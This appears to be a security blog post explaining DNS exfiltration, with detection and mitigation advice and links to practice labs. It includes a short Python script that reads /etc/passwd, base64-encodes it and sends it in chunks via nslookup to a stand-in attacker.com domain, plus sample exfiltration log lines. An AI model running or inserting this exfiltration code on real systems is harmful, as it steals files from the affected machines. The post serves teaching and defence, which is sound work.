---
title: "DNS Exfiltration — Stealing Data Through the One Protocol Nobody Blocks"
date: 2026-05-19
categories: [Concepts, Networking]
tags: [dns, exfiltration, data-theft, network-security, blue-team, detection, mitigation]
classes: wide
---

I want to talk about one of my favourite "wait, that actually works?" attacks. Not favourite because it's complex(quite the contrary really), favourite because it abuses something so fundamental. That thing is DNS. And the attack is DNS exfiltration.

---

## First, What Even Is DNS

Before the attack makes sense you need to understand what DNS does, because the attack is basically just abusing the normal job DNS already has.

When you type `google.com` into your browser, your computer doesn't actually know what that means. Computers talk in numbers : IP addresses like `142.250.185.78`. The name `google.com` is just a human understandable label. So before your browser can connect to anything, it quietly asks a DNS server: "hey, what's the IP address for google.com?" The DNS server looks it up and sends back the answer. Your browser connects. You barely notice it happened.

This lookup process is called a DNS query and happens constantly. Every website visit, every email, basically every internet action triggers one behind the scenes. And here's the key thing: almost every firewall in existence lets DNS traffic through without much thought. Because if you block DNS, nothing works. Users can't visit websites. Services break. The network is basically dead.

Attackers noticed this. If there's one protocol you can count on being allowed out of a secured locked-down network, it's DNS.

---
<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMzBxMzJsOXJ1dDF4cnlmdHhzYmhmOWJjcDVwc2Fza3p6bXcxemdyciZlcD12MV9naWZzX3NlYXJjaCZjdD1n/cPKWZB2aaB3rO/giphy.gif" 
     style="width: 100%; height: auto;" 
     alt="description">
     
## How the Attack Actually Works

Here's the creative part that got me when I first understood it.

A DNS query doesn't just contain the domain name. It contains the full address being looked up, including the subdomain. When you look up `mail.google.com`, the query says "tell me about the subdomain `mail` under `google.com`." That subdomain portion can contain arbitrary data as long as it looks like a valid hostname.Emphasis on "looks like" guys.
So an attacker who controls a domain, let's say `attacker.com`  can configure their DNS server to log every single query it receives. Now any query sent to anything ending in `.attacker.com` arrives at their server and gets logged. The attacker then takes whatever data they want to steal, encodes it into a format safe for DNS hostnames (usually Base64 with a couple of character swaps), splits it into small chunks because DNS has a size limit, and fires off one DNS query per chunk.

Each query looks like: `cm9vdDp4OjA6MDpyb290.attacker.com`

That random-looking string at the front? That's your data. Encoded, chunked, and dressed up as a subdomain. The firewall sees a DNS query. Because it is just that..a query,,it automatically trusts it and lets it through. The attacker's server receives it, logs the subdomain, strips off the `.attacker.com` part, and saves the chunk. Do this enough times and you've reassembled the entire stolen file on the other side. Completely silently.

The chunking is what made it click for me honestly. DNS has strict size limits — 63 characters per label, 253 total. You can't just dump an entire file in one query. So the attack sends dozens or hundreds of queries, each carrying a small piece. A 10MB file could take over 50,000 queries. Slow, but quiet. And most organisations aren't watching.

Here's what that looks like in a simplified script:

```python
import subprocess
import base64

# Read the file we want to steal
with open('/etc/passwd', 'r') as f:
    data = f.read()

# Base64 encode it, swap out characters DNS doesn't like
encoded = base64.b64encode(data.encode()).decode()
encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '')

# Split into hmm lets say 53 character chunks? Leaving room for the domain suffix though
chunks = [encoded[i:i+53] for i in range(0, len(encoded), 53)]

# One DNS query per chunk
for chunk in chunks:
    hostname = f"{chunk}.attacker.com"
    subprocess.run(['nslookup', hostname], capture_output=True)

# On the other side, attacker reads their DNS logs and reassembles the file
```

The firewall never complained once.

---

## Why This Is Hard to Stop

You can't block DNS. That's just the end of the discussion for most organisations. But beyond that, DNS exfiltration blends into normal traffic really well.

A typical large network generates millions of DNS queries every day from hundreds of machines. Individual malicious queries are invisible in that noise unless you're specifically looking for the patterns. And most security teams aren't monitoring DNS with anywhere near the same attention they give HTTP traffic or email.

Tools like **[DNScat2](https://github.com/iagox86/dnscat2)** take this further and build a full C2 (Command and Control channel) over DNS. An attacker can run commands on a compromised machine entirely through DNS queries, never touching HTTP or any more visible protocol. **[IODINE](https://github.com/yarrick/iodine)** goes even further and tunnels full IP traffic over DNS, essentially a VPN through your phone book. **[Cobalt Strike](https://www.cobaltstrike.com/)**, one of the most widely used  pentesting frameworks has built-in DNS beacon functionality specifically because DNS tends to slip past detection.

For further breakdown on the MITRE ATT&CK technique page for DNS exfiltration: [MITRE ATT&CK T1071.004](https://attack.mitre.org/techniques/T1071/004/)

---

## What It Looks Like in Your Logs

Normal DNS traffic is short, recognisable, and spread across many destinations. `mail.google.com`; four characters in the subdomain, well-known domain, thousands of machines querying it daily.

DNS exfiltration looks different. The subdomains are long and random-looking because Base64-encoded data has high entropy i.e it doesn't look like a word, it looks like noise. All the queries go to the same unknown domain. They come in rapid bursts from one machine. Nobody else on your network is querying that domain.

In a packet capture, the difference is obvious once you know what you're looking for:

```
# Normal traffic
query: mail.google.com
query: cdn.twitter.com
query: api.github.com

# Exfiltration traffic
query: cm9vdDp4OjA6MDpyb290Oi9yb290.attacker.com
query: Oi9iaW4vYmFzaAo.attacker.com
query: root.attacker.com
```

That second block is one machine, one destination, queries with 30+ character random subdomains, fired in quick succession. That's your signal.

---

## Detection

The patterns are detectable if you're watching for them.

**Subdomain length** is the easiest starting point. Legitimate DNS queries rarely have subdomains longer than 30 characters. Anything consistently longer than that, especially to an unfamiliar domain, is worth investigating.

**Query rate per destination** matters too. Normal browsing spreads DNS queries across many different domains. Exfiltration sends a high volume of queries to one specific domain in a short window. If a single machine fires 200 queries to an obscure domain in 30 seconds, that's not browsing behaviour.

**Entropy analysis** is more sophisticated but more reliable. Base64-encoded data looks statistically random because it essentially is. Tools like [RITA (Real Intelligence Threat Analytics)](https://github.com/activecm/rita-legacy) can score the randomness of DNS subdomains and flag anything that looks too random to be a real hostname.

**Baseline deviation** catches what rules miss. If a machine has never queried `.xyz` domains before and suddenly makes hundreds of queries to one, the change itself is the signal — regardless of whether the domain appears on any threat list.

---

## Mitigation

Detection tells you when it's happening. Mitigation makes it harder to do in the first place.

The most effective control is **forcing all DNS traffic through internal resolvers**. If every machine on your network has to use your DNS server (and the firewall blocks any attempt to query external DNS servers directly), you get full visibility and control over all DNS traffic. An attacker trying to communicate with an external server they control has to go through your resolver which is logged, filtered, and monitored.

**DNS filtering** builds on that. Services like Cisco Umbrella maintain threat intelligence on domains associated with DNS tunnelling tools and malicious infrastructure. Queries to known-bad domains get blocked before they leave your network.

**Rate limiting at the resolver** raises the cost of the attack. Exfiltrating a meaningful amount of data over DNS requires a lot of queries. A machine that exceeds a reasonable query rate threshold can be flagged automatically, limiting how fast data can leave even if the attack isn't immediately stopped.

**SIEM integration with DNS logs** ties everything together. Having your DNS logs feeding into a SIEM where you can write detection rules for subdomain length, query rate, and entropy gives your team the visibility to catch this in real time rather than weeks later during an incident review.

---

## The Point

DNS exfiltration isn't technically clever. It's structurally clever. It works because it hides inside something you can't turn off, through a protocol your firewall was designed to trust.

The lesson isn't "DNS is broken." DNS does exactly what it was designed to do. The lesson is that any protocol allowed through your perimeter becomes a potential communication channel and the ones that are *required* to be allowed through are the most dangerous ones to ignore.

Next time you look at DNS traffic, it's not just phone book lookups. Someone might be reading the whole filing cabinet out loud, one line at a time, to someone standing outside.

---

## Practice Labs

If you want to actually do this rather than just read about it:

- **[TryHackMe — Data Exfiltration](https://tryhackme.com/room/dataxexfilt)**: Hands-on lab, you perform DNS exfiltration yourself across a realistic network environment. Also covers SSH, ICMP, and HTTP exfiltration.
- **[TryHackMe — DNS Manipulation](https://tryhackme.com/room/dnsmanipulation)**: Covers DNS exfiltration and tunnelling with packet capture analysis.
- **[HackTheBox — Keep Tryin'](https://app.hackthebox.com/challenges/keep-tryin)**: PCAP analysis challenge involving DNS exfiltration and RC4 decryption. Defender-side perspective.

---

*Written by 0x5h4q | 0x5h4q.github.io*
